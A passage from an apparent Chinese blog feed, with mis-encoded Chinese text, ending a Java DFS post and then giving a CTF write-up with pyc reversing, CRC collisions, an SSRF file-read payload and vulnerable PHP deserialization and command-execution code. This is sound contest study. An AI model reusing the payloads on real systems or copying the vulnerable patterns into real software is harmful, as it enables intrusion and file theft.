punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//å½“å…ƒç´ è¿‡å¤šæ— æ³•åˆ—ä¸¾æ—¶ï¼ŒåŠ¨æ€ç”³è¯·æ•°ç»„ä»¥ä¸‹é¢è¿™ç§æ–¹å¼</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//ç”¨Scannerå®šä¹‰è¾“å…¥</span>        Scanner cin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//ç›¸å½“äºc++ä¸­çš„EOFåˆ¤æ–­</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>cin<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                m <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                n <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> flag <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> flag<span class="token operator">++</span><span class="token punctuation">)</span>                    map<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//                for (i = 0; i &lt; m; i++) {</span><span class="token comment" spellcheck="true">//                    for (j = 0; j &lt; n; j++) {</span><span class="token comment" spellcheck="true">//                        //map[i][j] = mapstrings[i][j];</span><span class="token comment" spellcheck="true">//                        System.out.print(map[i][j]);</span><span class="token comment" spellcheck="true">//                    }</span><span class="token comment" spellcheck="true">//                    System.out.print('\n');</span><span class="token comment" spellcheck="true">//                }</span><span class="token comment" spellcheck="true">//            }</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">//        }</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'@'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>                            flag1 <span class="token operator">=</span> flag1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>å…¶å®æ˜¯é¡ºä¾¿ç»ƒä¹ ä¸€ä¸‹javaï¼Œc++å’Œjavaæœ‰æ¯”è¾ƒå¤šç›¸ä¼¼ä¹‹å¤„ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›ä¸åŒçš„åœ°æ–¹ï¼Œæ‰€ä»¥éœ€è¦å¥½å¥½æ³¨æ„ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DFS </tag>
            
            <tag> algorithm </tag>
            
            <tag> ç®—æ³• </tag>
            
            <tag> coding </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç¬¬å››å±Šå…¨å›½é‚€è¯·èµ›_èµ›åå°ç»“</title>
      <link href="/2018/11/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E7%BD%91%E5%AE%89%E6%9A%A8%E5%85%A8%E5%9B%BD%E9%82%80%E8%AF%B7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%B0%8F%E7%BB%93/"/>
      <url>/2018/11/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E7%BD%91%E5%AE%89%E6%9A%A8%E5%85%A8%E5%9B%BD%E9%82%80%E8%AF%B7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›-èµ›åå°ç»“"><a href="#ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›-èµ›åå°ç»“" class="headerlink" title="ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›_èµ›åå°ç»“"></a>ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›_èµ›åå°ç»“</h1><blockquote><p>æ‰“å®Œè¿™ä¸ªç¬¬å››å±Šä¸Šæµ·å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ›åï¼Œç®€å•åšä¸ªå°ç»“ï¼Œå·©å›ºä¸€ä¸‹ğŸ˜­ã€‚</p></blockquote><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ç­¾åˆ°BASE32"><a href="#ç­¾åˆ°BASE32" class="headerlink" title="ç­¾åˆ°BASE32"></a>ç­¾åˆ°BASE32</h3><blockquote><p>ç¬¬ä¸€é“é¢˜æ˜¯BASE32ï¼Œç­¾åˆ°é¢˜ï¼Œé£˜è¿‡ã€‚</p></blockquote><h3 id="pycåç¼–è¯‘"><a href="#pycåç¼–è¯‘" class="headerlink" title="pycåç¼–è¯‘"></a>pycåç¼–è¯‘</h3><blockquote><p>ç¬¬äºŒé¢˜æ˜¯pythonçš„åç¼–è¯‘ï¼Œä¸€ä¸ªpycæ–‡ä»¶ã€‚</p><p>å¯èƒ½æˆ‘æ˜¯ç¢°å·§åšå‡ºæ¥çš„ï¼Œé€šè¿‡importå¯¼åŒ…ï¼ˆimportæ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œpycéƒ½èƒ½å¯¼ï¼‰ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªåˆ—è¡¨<code>[0,10,7,1,29,14,7,22,22,31,57,30,9,52,27]</code>ï¼ŒæŒ‰åˆ—è¡¨é¡ºåºä¾æ¬¡å¯¹â€fâ€,â€lâ€,â€aâ€,â€gâ€,å¼‚æˆ–å¯ä»¥å¾—åˆ°keyå€¼ä¸º102ï¼Œç„¶åå¯¹åˆ—è¡¨è¿›è¡Œå¼‚æˆ–æ“ä½œå¯ä»¥å¾—åˆ°flagã€‚</p><p>ä½†æ˜¯å¤§ä½¬ä»¬æ˜¯æ€ä¹ˆå»åšè¿™é¢˜çš„å‘¢ï¼šå‘ç°pycæ–‡ä»¶ä¸­æœ‰æ¶æ„æ’å…¥çš„ä¸€è¡Œå­—èŠ‚ç ï¼Œæ­£æ˜¯å› ä¸ºè¿™ä¸ªï¼Œå¯¼è‡´pycæ— æ³•è¢«åç¼–è¯‘ï¼Œåˆ é™¤ä¹‹ååç¼–è¯‘å¯ä»¥å¾—åˆ°ï¼š</p><pre class=" language-assembly"><code class="language-assembly">1       0  JUMP_ABSOLUTE         6  'to 6'           3             6  JUMP_ABSOLUTE         9  'to 9'           9  LOAD_CONST            0  ''          12  LOAD_CONST            1  10          15  LOAD_CONST            2  7          18  LOAD_CONST            3  1          21  LOAD_CONST            4  29          24  LOAD_CONST            5  14          27  LOAD_CONST            2  7          30  LOAD_CONST            6  22          33  LOAD_CONST            6  22          36  LOAD_CONST            7  31          39  LOAD_CONST            8  57          42  LOAD_CONST            9  30          45  LOAD_CONST           10  9          48  LOAD_CONST           11  52   2      51  LOAD_CONST           12  27          54  BUILD_LIST_15        15          57  STORE_NAME            0  'cmp'   3      60  LOAD_NAME             1  'raw_input'          63  CALL_FUNCTION_0       0   4      66  STORE_NAME            2  'flag'          69  LOAD_CONST            0  ''          72  STORE_NAME            3  'm'          75  SETUP_LOOP           91  'to 169'          78  LOAD_NAME             2  'flag'          81  GET_ITER          82  FOR_ITER             83  'to 168'          85  STORE_NAME            4  'i'          88  LOAD_NAME             5  'ord'          91  LOAD_NAME             4  'i'          94  CALL_FUNCTION_1       1          97  UNARY_INVERT          98  LOAD_CONST           13  102         101  BINARY_AND         102  LOAD_NAME             5  'ord'         105  LOAD_NAME             4  'i'         108  CALL_FUNCTION_1       1         111  LOAD_CONST           18  -103         114  BINARY_AND         115  BINARY_OR         116  STORE_NAME            4  'i'         119  LOAD_NAME             4  'i'         122  LOAD_NAME             0  'cmp'         125  LOAD_NAME             3  'm'         128  BINARY_SUBSCR         129  COMPARE_OP            2  '=='         132  POP_JUMP_IF_FALSE   144  'to 144'         135  LOAD_NAME             3  'm'   8     138  UNARY_NEGATIVE         139  LOAD_CONST           14  -1         142  BINARY_ADD         143  UNARY_NEGATIVE  10     144  STORE_NAME            3  'm'         147  JUMP_BACK            73  'to 73'         150  CONTINUE             73  'to 73'         153  LOAD_CONST           15  'wrong'         156  PRINT_ITEM         157  PRINT_NEWLINE_CONT         158  LOAD_NAME             6  'exit'         161  CALL_FUNCTION_0       0         164  POP_TOP         165  JUMP_BACK            73  'to 73'         168  POP_BLOCK       169_0  COME_FROM                '75'         169  LOAD_CONST           16  'right'         172  PRINT_ITEM         173  PRINT_NEWLINE_CONT</code></pre><p>åˆ†ææ¸…æ¥šé€»è¾‘ä¹‹åå¯ä»¥é€†å‡ºflagã€‚</p></blockquote><h3 id="N0find"><a href="#N0find" class="headerlink" title="N0find"></a>N0find</h3><blockquote><p>å¤§æ‚çƒ©ï¼Œé¦–å…ˆé€šè¿‡wiresharkæå–å‡ºä¸¤å¼ å›¾ç‰‡ï¼ˆå®é™…ä¸Šæ•°æ®åŒ…ä¸­è¿˜è—ç€ä¸€äº›ä¸ä¸ºäººçŸ¥çš„ä¸œè¥¿ï¼‰ï¼Œå…¶ä¸­ä¸€å¼ æ˜¯å…³é”®ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/ctfisfun.jpeg" alt=""></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸ª<code>ct??????</code>ï¼Œè«éæ˜¯ctfä»€ä¹ˆçš„ï¼Œå…­ä¸ªé—®å·ï¼Œå…«ä½ã€‚ï¼ˆåé¢å®˜æ–¹ç»™å‡ºæç¤ºï¼Œopenbuffï¼ˆæŸä¸€ä¸çŸ¥é“å“ªä¸ªè§’è½çš„éšå†™è½¯ä»¶ï¼‰ï¼Œcrcç¢°æ’ï¼Œä»¥åŠç¢°æ’å‡ºæ¥çš„å€¼ä¸­å«æœ‰fï¼‰ã€‚</p><p>è¿™ä¸ªæ—¶å€™å°±æ‡µé€¼äº†ï¼Œæ‹¿ä»€ä¹ˆå»crcç¢°æ’ï¼Œç¢°æ’å®Œåˆèƒ½å¹²å•¥ï¼Ÿ</p><p>ä»”ç»†çœ‹çœ‹æ•°æ®åŒ…ä¸­ï¼Œå‡ºç°äº†crcå­—çœ¼ï¼Œå¹¶ä¸”å«æœ‰3ä¸ªç–‘ä¼¼crcçš„å€¼ï¼š</p><p><code>C61B1F65</code>,<code>E74E142D</code>,<code>648BDAD5</code></p><p>æ‹¿crcç¢°æ’è„šæœ¬è¿›è¡Œç¢°æ’å¾—åˆ°ä¸‰ç»„ä¸­æ¯ç»„å«æœ‰fçš„å€¼ï¼š</p><p>1.<code>93fjhl    fBWjIv</code></p><p>2.<code>mbof3k      Xez1fW</code></p><p>3.<code>v4gfx1    5fyJIo</code></p><p>ç„¶åæ‹¿openbuffè¿›è¡Œè§£å¯†ï¼Œéœ€è¦ä¸‰ä¸ªå¯†é’¥ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢ä¸‰ç»„è¿›è¡Œæ’åˆ—ç»„åˆï¼Œè€Œä¸”å¼€å¤´è¿˜éœ€è¦åŠ ä¸Šctï¼Œå³å¯getflagã€‚</p></blockquote><h3 id="92"><a href="#92" class="headerlink" title="92"></a>92</h3><blockquote><p>emmmæ²¡å•¥å¥½è¯´çš„ï¼Œè€ƒç‚¹å°±æ˜¯å­—ç¬¦ä¸²åè½¬ï¼Œä»¥åŠå¯¹å­—ç¬¦çš„æ•æ„Ÿæ€§ï¼Œè¿˜æœ‰å¯¹base92çš„äº†è§£ï¼Œé¢˜ç›®ç»™å‡ºäº†92åŸºæœ¬ä¸Šå¯ä»¥çŸ¥é“base92è¿™ç©æ„å„¿äº†ï¼Œåé¢çš„éš¾åº¦ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œéœ€è¦ä¸€å®šçš„çµæ´»æ€§ã€‚</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><blockquote><p>è¿™æ¬¡çš„webæ„Ÿè§‰å…¨æ˜¯phpï¼Œæ¯”è¾ƒâ€ç¡¬æ ¸â€ã€‚</p></blockquote><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><blockquote><p>é€šè¿‡post ä¼ admin=1å¹¶ä¸”ç”¨x-client-ipä¼ªé€ æœ¬åœ°ipï¼Œå³å¯åˆ°è¾¾ç”¨urlæ‰“ssrfçš„åœ°æ­¥ï¼Œé€šè¿‡æŒ‡å®šurlï¼Œæ‰“åˆ°çš„å†…å®¹ä¼šä»¥å›¾ç‰‡æ ¼å¼å­˜å‚¨åˆ°downloadç›®å½•ã€‚</p><p>è¿™é‡Œéœ€è¦ç”¨ fileåè®®ï¼Œè€Œä¸æ˜¯httpåè®®ã€‚</p><p>å¤§ä½¬æ˜¯è¿™æ ·æ„é€ urlçš„ï¼š</p><p><code>url=file://@127.0.0.1:80@www.ichunqiu.com/./..//var/www/html/flag.php</code></p><p>è€Œæˆ‘ï¼š</p><p><code>url=file://www.ichunqiu.com/var/www/html/flag.php</code></p><p>å¯èƒ½åˆæ˜¯ç¢°å·§æ‰“åˆ°çš„ï¼Ÿæˆ‘ä»¬å¯ä»¥è·å¾—source.phpçš„æºç ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"you need to login as admin!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;!-- post param  'admin' -->"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'www.ichunqiu.com'</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'download/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">';img1.jpg'</span><span class="token punctuation">;</span>                <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$img</span><span class="token operator">=</span><span class="token string">"&lt;img src=\""</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"\"/>"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> "you need post url<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.ichunqiu.com";</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"only 127.0.0.1 can get the flag!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>å®é™…ä¸Šè€ƒçš„æ˜¯<code>libcurl</code>and<code>parse_url()</code>è§£æé—®é¢˜ã€‚</p><p>è¿™é‡Œå¯ä»¥å‚è€ƒ<a href="http://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener">ä¸€å¶é£˜é›¶å¸ˆå‚…</a>/)å†™çš„ä¸€ç¯‡åšæ–‡ã€‚</p></blockquote><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><blockquote><p>æ‰«ç›®å½•å¾—swpäº¤æ¢æ–‡ä»¶==&gt;vimæ¢å¤æ–‡ä»¶==&gt;å¾—åˆ°index.phpæºç ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">come</span><span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[&lt;>*;|?\n ]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>               <span class="token keyword">function</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo $host"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"echo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$first</span><span class="token operator">=</span><span class="token string">'hi'</span><span class="token punctuation">;</span><span class="token variable">$var</span><span class="token operator">=</span><span class="token string">'var'</span><span class="token punctuation">;</span><span class="token variable">$bbb</span><span class="token operator">=</span><span class="token string">'bbb'</span><span class="token punctuation">;</span><span class="token variable">$ccc</span><span class="token operator">=</span><span class="token string">'ccc'</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>            $<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span 